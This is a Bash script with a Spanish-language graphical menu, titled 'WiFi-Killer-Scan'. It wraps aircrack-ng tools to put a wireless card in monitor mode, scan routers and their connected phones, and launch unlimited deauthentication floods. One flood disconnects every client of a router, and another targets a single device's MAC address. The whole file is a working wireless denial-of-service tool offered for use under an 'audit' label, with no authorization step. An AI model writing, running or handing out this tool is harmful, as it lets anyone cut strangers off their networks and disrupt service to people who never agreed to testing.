#!/bin/bash
# WiFi-Killer-Scan v14.0 - Flujo de Trabajo Profesional

while true; do
    CHOICE=$(zenity --list --title="📡 WiFi-Killer-Scan: SISTEMA DE AUDITORÍA" \
        --column="ID" --column="Acción" --column="Descripción" \
        --width=750 --height=600 \
        1 "⚡ MODO MONITOR" "Activar interfaz y limpiar procesos" \
        2 "🌐 1. ESCANEO TOTAL" "Ver todos los Routers disponibles" \
        3 "🔍 2. ESCANEO ENFOCADO (STATIONS)" "Elegir BSSID para ver sus celulares" \
        4 "🔥 3. BLOQUEO TOTAL" "Desconexión Masiva (Broadcast)" \
        5 "🎯 4. BLOQUEO DIRIGIDO" "Ataque Agresivo a un solo dispositivo" \
        6 "🔄 RESTAURAR RED" "Apagar monitor y volver a Internet" \
        7 "❌ SALIR" "Cerrar herramienta")

    if [ $? -ne 0 ]; then break; fi

    case $CHOICE in
        1)
            sudo airmon-ng check kill
            sudo airmon-ng start wlan0 | zenity --text-info --title="Estado" ;;
        2)
            # ESCANEO TOTAL: Para encontrar el BSSID y el Canal del Router
            gnome-terminal --title="ESCANEO TOTAL: IDENTIFICA EL BSSID Y CANAL" -- sh -c "sudo airodump-ng wlan0mon; exec bash" ;;
        3)
            # ESCANEO ENFOCADO: Una vez que tienes el BSSID del paso anterior
            BSSID_SCAN=$(zenity --entry --title="Escaneo Enfocado" --text="Introduce el BSSID del Router elegido:")
            CH_SCAN=$(zenity --entry --title="Escaneo Enfocado" --text="Introduce el Canal de ese Router:")
            
            if [ ! -z "$BSSID_SCAN" ] && [ ! -z "$CH_SCAN" ]; then
                gnome-terminal --title="DISPOSITIVOS EN $BSSID_SCAN (BUSCA 'STATIONS')" -- sh -c "sudo airodump-ng --bssid $BSSID_SCAN -c $CH_SCAN wlan0mon; exec bash"
            else
                zenity --error --text="Debes poner el BSSID y el Canal del Router."
            fi ;;
        4)
            BSSID=$(zenity --entry --title="Bloqueo Masivo" --text="BSSID del Router:")
            CANAL=$(zenity --entry --title="Configuración" --text="Canal (CH):")
            if [ ! -z "$BSSID" ]; then
                sudo iwconfig wlan0mon channel $CANAL
                xterm -hold -fg yellow -bg black -title "BLOQUEO TOTAL" -e "sudo aireplay-ng -0 0 -a $BSSID wlan0mon" &
            fi ;;
        5)
            # BLOQUEO DIRIGIDO: Usando la MAC del celular que viste en la Opción 3
            BSSID=$(zenity --entry --title="Ataque de Precisión" --text="BSSID del Router:")
            CLIENTE=$(zenity --entry --title="Ataque de Precisión" --text="MAC del Celular (Station):")
            CANAL=$(zenity --entry --title="Configuración" --text="Canal (CH):")
            if [ ! -z "$BSSID" ] && [ ! -z "$CLIENTE" ]; then
                sudo iwconfig wlan0mon channel $CANAL
                xterm -hold -fg red -bg black -title "ATAQUE AGRESIVO" \
                -e "sudo aireplay-ng -0 0 -a $BSSID -c $CLIENTE --ignore-negative-one wlan0mon" &
                ATAQUE_PID=$!
                zenity --info --text="Atacando a $CLIENTE.\nOK para detener."
                sudo kill $ATAQUE_PID && sudo killall aireplay-ng 2>/dev/null
            fi ;;
        6)
            sudo airmon-ng stop wlan0mon
            sudo systemctl restart NetworkManager
            zenity --info --text="Internet restaurado." ;;
        7) exit ;;
    esac
done
